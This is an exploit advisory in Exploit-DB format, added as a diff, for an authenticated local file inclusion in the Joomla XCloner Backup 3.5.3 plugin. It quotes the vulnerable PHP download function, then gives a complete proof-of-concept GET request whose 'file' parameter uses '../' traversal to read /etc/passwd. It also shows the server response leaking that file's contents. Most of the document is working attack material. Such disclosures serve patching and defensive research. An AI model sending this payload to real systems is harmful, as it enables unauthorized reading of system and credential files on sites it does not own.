@@ -1,0 +1,103 @@
+# Exploit Title: Joomla! Plugin XCloner Backup 3.5.3 - Local File Inclusion (Authenticated)
+# Date: 2020-05-10
+# Exploit Author: Mehmet Kelepçe / Gais Cyber Security
+# Exploit-Db Author ID: 8763
+# Reference: https://www.xcloner.com/xcloner-news/security-release-available-for-archived-joomla-version/
+# Vendor Homepage: http://www.xcloner.com
+# Software Link: https://www.xcloner.com/support/download/
+# Version: 3.5.3
+# Tested on: Kali Linux - Apache2
+--------------------------------------------------------------------------------
+Detail:
+--------------------------------------------------------------------------------
+File: administrator/components/com_xcloner-backupandstore/admin.cloner.php -->
+------------
+case 'download':
+ downloadBackup($_REQUEST['file']);
+ break;
+-------------
+downloadBackup function's file -> administrator/components/com_xcloner-backupandstore/cloner.functions.php
+Vulnerable parameter: file
+
+downloadBackup function's definition
+--------------------------------------------------------------------------------
+  function downloadBackup($file)
+  {
+      global $_CONFIG;
+
+      $file = realpath($_CONFIG['clonerPath'] . "/$file");
+
+      //First, see if the file exists
+      if (!is_file($file)) {
+          die("<b>404 File $file was not found!</b>");
+      }
+
+      //File Info
+      $len = get_filesize($file);
+      $filename = basename($file);
+      $file_extension = strtolower(substr(strrchr($filename, "."), 1));
+
+      //Setam Content-Type-urile pentru  fisierul in cauza
+      switch ($file_extension) {
+          default:
+              $ctype = "application/force-download";
+      }
+
+ smartReadFile($file, $filename);
+
+      exit;
+  }
+--------------------------------------------------------------------------------
+and smartReadFile function's definition
+--------------------------------------------------------------------------------
+function smartReadFile($location, $filename, $mimeType='application/octet-stream')
+{ if(!file_exists($location))
+  { header ("HTTP/1.0 404 Not Found");
+    return;
+  }
+
+  $size=filesize($location);
+  $time=date('r',filemtime($location));
+
+  $fm=@fopen($location,'r');
+.
+.
+.
+--------------------------------------------------------------------------------
+PoC:
+Request:
+--------------------------------------------------------------------------------
+GET /joomla/administrator/index.php?option=com_xcloner-backupandrestore&task=download&file=../../../../../../../../etc/passwd HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/joomla/administrator/index.php?option=com_xcloner-backupandrestore&task=view
+Connection: close
+Cookie: COOKIES
+Upgrade-Insecure-Requests: 1
+--------------------------------------------------------------------------------
+Response:
+--------------------------------------------------------------------------------
+HTTP/1.0 200 OK
+Date: Sun, 10 May 2020 18:12:04 GMT
+Server: Apache/2.4.41 (Debian)
+Cache-Control: public, must-revalidate, max-age=0
+Pragma: no-cache
+Accept-Ranges: bytes
+Content-Length: 3347
+Content-Range: bytes 0-3347/3347
+Content-Disposition: inline; filename=passwd
+Content-Transfer-Encoding: binary
+Last-Modified: Sun, 22 Mar 2020 05:41:35 -0700
+Connection: close
+Content-Type: application/octet-stream
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+.
+.
